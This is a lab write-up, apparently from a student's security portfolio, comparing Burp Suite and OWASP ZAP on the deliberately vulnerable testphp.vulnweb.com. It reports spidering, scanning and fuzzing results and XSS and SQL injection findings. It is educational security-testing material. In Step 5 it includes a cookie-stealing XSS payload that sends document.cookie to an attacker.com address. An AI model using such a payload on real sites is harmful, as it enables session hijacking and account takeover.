# Web Application Security Testing with Burp Suite and OWASP ZAP

## Overview

This lab tested the intentionally vulnerable website http://testphp.vulnweb.com using two industry-standard web application security tools: Burp Suite Professional and OWASP ZAP. The goal was to compare how both tools identify vulnerabilities through automated scanning and manual testing techniques. Traffic was proxied through each tool, the application was crawled to discover endpoints, and payloads were injected to confirm exploitability.

## Objectives

- Configure browsers to proxy traffic through security testing tools
- Use spidering to discover hidden application endpoints
- Compare automated vulnerability detection between Burp Suite and OWASP ZAP
- Manually fuzz input parameters to confirm exploitable weaknesses
- Analyze HTTP request/response headers for information leakage
- Document the practical differences between commercial and open-source testing tools

## Lab Environment

- **Attacker Machine:** Kali Linux
- **Target Application:** http://testphp.vulnweb.com (intentionally vulnerable PHP site)
- **Browser:** Firefox configured to proxy through 127.0.0.1:8080
- **Network:** Internet connection to remote target

## Tools Used

- Burp Suite Professional (v2025.1+)
- OWASP ZAP (latest version)
- Firefox browser with manual proxy configuration

## Methodology

### Step 1: Burp Suite HTTP Traffic Analysis

I started with Burp Suite to understand what information the application leaks in normal HTTP communication. After configuring Firefox to route traffic through Burp's proxy (127.0.0.1:8080), I navigated to the target homepage and captured the request/response exchange.

![Burp Suite HTTP request and response headers](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/06_01%20Burp%20Suite%20HTTP%20request%20and%20response%20headers.jpg)

**Request analysis:** The GET request revealed the target hostname (testphp.vulnweb.com) and the client's User-Agent string, which identified Mozilla Firefox as the browser. This is standard reconnaissance information an attacker collects.

**Response analysis:** The server responded with HTTP 200 (successful page load), but more critically, it disclosed the web server type (nginx/1.19.0) and the backend PHP version (PHP/5.6.40). Knowing the exact versions lets an attacker search for known exploits specific to those software releases. If PHP 5.6.40 has a published CVE, this application is vulnerable.

### Step 2: Automated Spidering with Burp Suite

Spidering crawls the application by following links, submitting forms, and parsing JavaScript to discover every accessible endpoint. This is critical because many vulnerabilities hide in pages that are not linked from the homepage.

I ran Burp's spider against the target and it discovered approximately 42 URLs. The main public pages included index.php, artists.php, search.php, guestbook.php, cart.php, login.php, and product.php.

![Burp Suite spider results showing discovered URLs](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/06_02%20Burp%20Suite%20spider%20results%20showing%20discovered%20URLs.jpg)

**Hidden pages discovered:**
- **/secured/** - Flagged for SQL injection testing (requires authentication bypass to access)
- **/hpp/** - HTTP Parameter Pollution test endpoint
- **/guestbook.php** - Form submission page with potential for stored XSS
- **/search.php** - Search functionality reflects user input (prime target for reflected XSS)
- **/Flash/** - Legacy Flash directory (outdated technology, likely unpatched)
- **/crossdomain.xml** - Flash cross-domain policy file that can leak allowed domains

These endpoints are not directly linked from the homepage, so manual browsing would miss them. Automated discovery finds the full attack surface.

### Step 3: Burp Suite Vulnerability Scanning

Burp's automated scanner tests each discovered parameter with common attack payloads. The scan flagged multiple instances of cross-site scripting (XSS) across different pages.

**How XSS works:** When a user submits input through a form or URL parameter, the application should sanitize it before displaying it back on the page. If it does not sanitize, an attacker can inject JavaScript that the victim's browser will execute.

**Manual confirmation:** I tested the search functionality with a normal query first. Searching for "test" returned "Results for: test" with no issues. Then I injected the payload `<script>alert('hacked')</script>` into the search box. The application echoed this script tag directly into the HTML response without escaping it. The browser interpreted it as legitimate code and executed it, displaying a popup with "hacked". This confirms the input is reflected unsafely and the XSS vulnerability is exploitable.

![XSS payload execution in browser](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/06_03%20XSS%20payload%20execution%20in%20browser.jpg)

### Step 4: OWASP ZAP Setup and Traffic Capture

I switched to OWASP ZAP to compare detection capabilities. After configuring the same proxy settings (127.0.0.1:8080), I browsed the target application to capture baseline traffic.

![OWASP ZAP HTTP request](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/06_04a%20OWASP%20ZAP%20HTTP%20request.jpg) ![OWASP ZAP HTTP response](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/06_04b%20OWASP%20ZAP%20HTTP%20response.jpg)

**Comparison with Burp Suite:** The HTTP headers captured by ZAP are identical to those in Burp Suite. Both tools intercept the same raw traffic. The difference is in the user interface. ZAP displays the header information separately from the HTML body structure, while Burp combines them in a single view. This is a presentation choice, not a functional difference. The underlying data is the same.

### Step 5: OWASP ZAP Automated Scanning

I used ZAP's "Quick Start" automated scan, which combines spidering with active vulnerability testing. ZAP's spider crawled the application and discovered 91 URLs, significantly more than Burp Suite's 42 URLs.

![OWASP ZAP scan progress showing 91 URLs discovered](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/06_05%20OWASP%20ZAP%20scan%20progress%20showing%2091%20URLs%20discovered.jpg)

**Why the difference?** ZAP includes both a traditional Spider and an Ajax Spider. The Ajax Spider executes JavaScript to discover dynamically loaded content that static HTML parsing misses. Modern web applications load content through JavaScript after the initial page load, and only Ajax-aware crawlers find these endpoints. Burp Suite has similar capabilities in its paid version, but ZAP includes this for free.

**Vulnerability findings:** ZAP detected the same XSS vulnerabilities that Burp found, confirming consistency between tools. Both flagged reflected XSS in search.php, artists.php, guestbook.php, product.php, listproducts.php, and secured/newuser.php. ZAP also identified SQL injection in the same locations.

![OWASP ZAP vulnerability alerts](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/06_06%20OWASP%20ZAP%20vulnerability%20alerts.jpg)

**Impact of XSS:** An attacker can steal session cookies by injecting `<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>`. This sends the victim's authentication cookie to the attacker's server, allowing full account takeover. The attacker can also redirect users to phishing sites or inject keyloggers to capture credentials on future logins.

### Step 6: Tool Comparison and Preference

**OWASP ZAP advantages:**
- Discovered 91 URLs vs Burp's 42 (better coverage)
- Ajax Spider included without additional cost
- Can specify which browser to use for authenticated scanning
- Open source with active community development

**Burp Suite advantages:**
- More intuitive interface for beginners
- Better manual testing workflow
- Industry standard tool (recognized by hiring managers)

**My preference:** I would use OWASP ZAP for vulnerability scanning because it provides more detailed discovery results without requiring a paid license. However, I acknowledge that Burp Suite's interface makes it easier to learn the fundamentals. In a professional setting, I would use both - ZAP for comprehensive automated scanning and Burp for manual exploitation work.

### Step 7: Manual Fuzzing Technique

Automated scanners test common payloads, but manual fuzzing tests application behavior with custom inputs. I used OWASP ZAP's fuzzer to inject XSS payloads into the search parameter.

After submitting a normal search query to generate a POST request to search.php, I right-clicked the request and selected "Fuzz". I loaded XSS payload lists into the fuzzer, which generated multiple variations of the attack string.

![OWASP ZAP fuzzer generating payloads](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/06_07%20OWASP%20ZAP%20fuzzer%20generating%20payloads.jpg)

**Challenge encountered:** The fuzzer generated 48 requests with different XSS payloads, but I could not render the response body directly in ZAP's interface due to unfamiliarity with the tool's response inspection features. The interface showed HTTP 200 status codes and response sizes, but I needed to see the actual HTML output to confirm exploitation.

**Workaround:** Instead of trying to decode the interface, I copied one of the successful XSS payloads (`<script>alert('hacked')</script>`) and pasted it directly into the search bar in the browser. The popup triggered immediately, confirming the injection worked.

![Successful XSS injection showing alert popup](https://github.com/Fabelt14/Cybersecurity_Portfolio/blob/main/ICDFA%20Internship/Phase%201/Screenshots/06_03%20XSS%20payload%20execution%20in%20browser.jpg)

This highlights a key difference between automated scanning and manual testing. The fuzzer confirmed the vulnerability exists, but manual injection in the browser proved exploitability from an attacker's perspective. Both approaches provide value.

## Findings

**Cross-Site Scripting (XSS) - High Severity**

Multiple pages reflect user input without sanitization: search.php, artists.php, guestbook.php, product.php, listproducts.php, secured/newuser.php. An attacker can inject arbitrary JavaScript that executes in victim browsers. Confirmed exploitable through manual injection of `<script>alert('hacked')</script>`.

**SQL Injection - High Severity**

The application concatenates user input directly into SQL queries without parameterization. Detected in artists.php, secured/, guestbook.php, product.php, and listproducts.php. An attacker can manipulate database queries to extract data, bypass authentication, or modify records.

**Information Disclosure - Medium Severity**

Server response headers expose nginx/1.19.0 and PHP/5.6.40 version information. This allows attackers to search for known vulnerabilities specific to these software versions. Additionally, /crossdomain.xml reveals allowed domains for Flash applications.

**Outdated Technology - Low Severity**

The /Flash/ directory indicates the application uses Adobe Flash, which Adobe discontinued in December 2020. Flash is no longer patched and contains numerous security vulnerabilities.

## Challenges Faced

**OWASP ZAP fuzzer interface confusion:** After generating 48 fuzzed requests with different XSS payloads, I could not immediately locate the response rendering feature in ZAP's interface. The tool showed me status codes and response sizes, but I needed to see the actual HTML output to confirm whether the payload executed. Instead of spending time learning the interface mid-test, I copied the payload and tested it manually in the browser. This worked, but a more experienced ZAP user would know how to view the rendered response directly in the tool.

**Spider coverage differences:** Burp Suite discovered 42 URLs while OWASP ZAP discovered 91 URLs on the same target. I initially assumed Burp was misconfigured, but after reviewing both results, I realized ZAP's Ajax Spider was discovering JavaScript-loaded content that Burp's free spider missed. This taught me that tool choice affects coverage, and multiple tools find different results.

## Key Takeaways

**Automated scanners find the obvious, manual testing confirms exploitability.** Both Burp Suite and OWASP ZAP flagged XSS and SQL injection, but the automated alerts just said "vulnerability detected". Manual injection with `<script>alert('hacked')</script>` proved the attack works from an attacker's perspective. Always confirm scanner findings manually.

**Different tools discover different attack surfaces.** OWASP ZAP's Ajax Spider found 91 URLs compared to Burp's 42 URLs. JavaScript-heavy applications require Ajax-aware crawlers. Relying on a single tool means missing parts of the application.

**Version disclosure enables targeted attacks.** The server header revealed nginx/1.19.0 and PHP/5.6.40. An attacker can search CVE databases for known exploits specific to these versions. Never expose version information in production environments.

**Fuzzing tests application behavior under unexpected input.** The fuzzer generated 48 different XSS payloads, each testing how the application handles various special characters and encoding. This is faster than manually typing variations and helps identify which payloads bypass weak filters.

**Open-source tools match commercial tools for most tasks.** OWASP ZAP is free and provided more comprehensive scanning than Burp Suite's community edition. For learning and portfolio building, ZAP offers professional-grade capabilities without licensing costs.

## Disclaimer

This lab was performed against an intentionally vulnerable test application (http://testphp.vulnweb.com) designed for security training. No unauthorized systems were tested. All testing was conducted in accordance with the site's terms of service and educational usage policies.
